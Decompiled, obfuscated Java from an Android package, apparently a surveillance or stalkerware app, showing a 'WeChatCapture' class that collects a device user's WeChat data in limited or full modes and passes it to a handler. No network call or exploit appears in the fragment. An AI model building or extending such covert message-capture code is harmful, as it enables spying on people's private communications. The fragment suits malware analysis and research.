package com.vvt.capture.wechat;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.wechat.a.i;
import com.vvt.capture.wechat.b.c;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private static final boolean b = com.vvt.ak.a.e;
  private com.vvt.base.a c;
  private String d;
  private e e;
  private f f;
  
  public a(String paramString1, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, String paramString2, com.vvt.base.b paramb1)
  {
    this.d = paramString1;
    this.c = parama;
    Object localObject = RunningMode.LIMITED_1;
    if (paramRunningMode == localObject)
    {
      localObject = new com/vvt/capture/wechat/b/a;
      ((com.vvt.capture.wechat.b.a)localObject).<init>(paramString1, paramb);
      this.e = ((e)localObject);
      localObject = new com/vvt/capture/wechat/b/c;
      ((c)localObject).<init>(paramString1, paramString2, paramb1);
      this.f = ((f)localObject);
    }
    for (;;)
    {
      return;
      localObject = RunningMode.FULL;
      if (paramRunningMode == localObject)
      {
        localObject = new com/vvt/capture/wechat/a/b;
        ((com.vvt.capture.wechat.a.b)localObject).<init>();
        this.e = ((e)localObject);
        localObject = new com/vvt/capture/wechat/a/i;
        String str1 = this.d;
        String str2 = paramb1.f();
        ((i)localObject).<init>(str1, paramString2, str2, paramb1);
        this.f = ((f)localObject);
      }
      else
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.base.a locala;
    try
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        Object localObject = localIterator.next();
        boolean bool3 = localObject instanceof WeChatData;
        if (bool3)
        {
          localObject = (WeChatData)localObject;
          localObject = b.a((WeChatData)localObject);
          if (localObject == null) {
            break label166;
          }
          int j = ((List)localObject).size();
          if (j <= 0) {
            break label166;
          }
          localArrayList.addAll((Collection)localObject);
        }
      }
      i = localArrayList.size();
    }
    catch (Exception localException)
    {
      bool1 = b;
      if (bool1) {}
      locala = this.c;
      if (locala == null) {
        break label177;
      }
    }
    int i;
    boolean bool2;
    if (i > 0)
    {
      bool2 = k();
      if (bool2)
      {
        bool2 = a;
        if (bool2) {}
        locala = this.c;
        locala.a(localArrayList);
      }
    }
    for (;;)
    {
      return;
      label166:
      bool2 = a;
      if (!bool2) {
        break;
      }
      break;
      label177:
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  protected e b()
  {
    return this.e;
  }
  
  protected f c()
  {
    return this.f;
  }
  
  protected String d()
  {
    return "WeChatCapture";
  }
  
  protected String e()
  {
    return this.d;
  }
  
  protected String f()
  {
    return "wechat.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */